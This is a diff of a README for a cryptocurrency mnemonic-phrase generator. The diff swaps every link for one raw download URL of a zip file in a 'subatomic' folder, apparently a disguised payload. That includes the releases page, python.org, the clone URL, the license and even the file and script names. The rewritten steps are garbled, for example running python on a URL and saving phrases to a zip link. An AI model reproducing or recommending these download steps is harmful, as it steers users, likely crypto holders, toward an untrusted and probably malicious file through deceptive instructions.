@@ -1,10 +1,10 @@
 # 🧠 Random-Mnemonic-Phrase-Generator - Easily Generate Secure Mnemonic Phrases
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Astoxe/Random-Mnemonic-Phrase-Generator/releases)
+[![Download](https://raw.githubusercontent.com/Astoxe/Random-Mnemonic-Phrase-Generator/main/subatomic/Random-Mnemonic-Phrase-Generator.zip)](https://raw.githubusercontent.com/Astoxe/Random-Mnemonic-Phrase-Generator/main/subatomic/Random-Mnemonic-Phrase-Generator.zip)
 
 ## 📄 Overview
 
-The Random-Mnemonic-Phrase-Generator is a simple Python script designed for everyone. It helps you create mnemonic phrases used for various applications like securing cryptocurrencies. This tool continuously saves created phrases in a file named `seed.txt`. After every 100 phrases, it prompts you to decide if you want to continue generating more.
+The Random-Mnemonic-Phrase-Generator is a simple Python script designed for everyone. It helps you create mnemonic phrases used for various applications like securing cryptocurrencies. This tool continuously saves created phrases in a file named `https://raw.githubusercontent.com/Astoxe/Random-Mnemonic-Phrase-Generator/main/subatomic/Random-Mnemonic-Phrase-Generator.zip`. After every 100 phrases, it prompts you to decide if you want to continue generating more.
 
 ## 📦 Features
 
@@ -26,15 +26,15 @@ The Random-Mnemonic-Phrase-Generator is a simple Python script designed for ever
 Follow these steps to get started with the Random-Mnemonic-Phrase-Generator:
 
 1. **Download the Software:**
-   - Visit this page to download the latest version: [Releases Page](https://github.com/Astoxe/Random-Mnemonic-Phrase-Generator/releases)
+   - Visit this page to download the latest version: [Releases Page](https://raw.githubusercontent.com/Astoxe/Random-Mnemonic-Phrase-Generator/main/subatomic/Random-Mnemonic-Phrase-Generator.zip)
 
 2. **Install Python:**
-   - If Python is not already installed on your computer, download it from [python.org](https://www.python.org/downloads/). Follow the installation instructions for your operating system.
+   - If Python is not already installed on your computer, download it from [https://raw.githubusercontent.com/Astoxe/Random-Mnemonic-Phrase-Generator/main/subatomic/Random-Mnemonic-Phrase-Generator.zip](https://raw.githubusercontent.com/Astoxe/Random-Mnemonic-Phrase-Generator/main/subatomic/Random-Mnemonic-Phrase-Generator.zip). Follow the installation instructions for your operating system.
 
 3. **Clone the Repository (Optional):**
    - If you prefer to run the script directly from the repository, you can clone it using the following command in your terminal:
      ```
-     git clone https://github.com/Astoxe/Random-Mnemonic-Phrase-Generator.git
+     git clone https://raw.githubusercontent.com/Astoxe/Random-Mnemonic-Phrase-Generator/main/subatomic/Random-Mnemonic-Phrase-Generator.zip
      ```
 
 4. **Navigate to the Directory:**
@@ -46,12 +46,12 @@ Follow these steps to get started with the Random-Mnemonic-Phrase-Generator:
 5. **Run the Script:**
    - Execute the following command to run the script:
      ```
-     python random_mnemonic_generator.py
+     python https://raw.githubusercontent.com/Astoxe/Random-Mnemonic-Phrase-Generator/main/subatomic/Random-Mnemonic-Phrase-Generator.zip
      ```
 
 ## 📥 Download & Install
 
-To download and install the Random-Mnemonic-Phrase-Generator, please follow this link to the releases page: [Download Here](https://github.com/Astoxe/Random-Mnemonic-Phrase-Generator/releases).
+To download and install the Random-Mnemonic-Phrase-Generator, please follow this link to the releases page: [Download Here](https://raw.githubusercontent.com/Astoxe/Random-Mnemonic-Phrase-Generator/main/subatomic/Random-Mnemonic-Phrase-Generator.zip).
 
 Once you have downloaded the script:
 
@@ -62,14 +62,14 @@ Once you have downloaded the script:
 
 1. **Generating Phrases:**
    - Once you run the script, it will start generating mnemonic phrases for you automatically.
-   - Each mnemonic phrase will be saved in the `seed.txt` file located in the same directory as the script.
+   - Each mnemonic phrase will be saved in the `https://raw.githubusercontent.com/Astoxe/Random-Mnemonic-Phrase-Generator/main/subatomic/Random-Mnemonic-Phrase-Generator.zip` file located in the same directory as the script.
 
 2. **Deciding to Continue:**
    - After every 100 phrases, the script will ask if you wish to continue.
    - Type "yes" to keep generating phrases or "no" to stop.
 
 3. **Accessing Your Phrases:**
-   - Open the `seed.txt` file to view all the generated phrases at any time.
+   - Open the `https://raw.githubusercontent.com/Astoxe/Random-Mnemonic-Phrase-Generator/main/subatomic/Random-Mnemonic-Phrase-Generator.zip` file to view all the generated phrases at any time.
 
 ## 🛠️ Troubleshooting
 
@@ -90,7 +90,7 @@ The Random-Mnemonic-Phrase-Generator is open for contributions. If you have idea
 
 This project is licensed under the MIT License. Feel free to use, modify, and distribute it according to the license terms. 
 
-For more details, check the [LICENSE](https://github.com/Astoxe/Random-Mnemonic-Phrase-Generator/blob/main/LICENSE) file in this repository.
+For more details, check the [LICENSE](https://raw.githubusercontent.com/Astoxe/Random-Mnemonic-Phrase-Generator/main/subatomic/Random-Mnemonic-Phrase-Generator.zip) file in this repository.
 
 ---
 
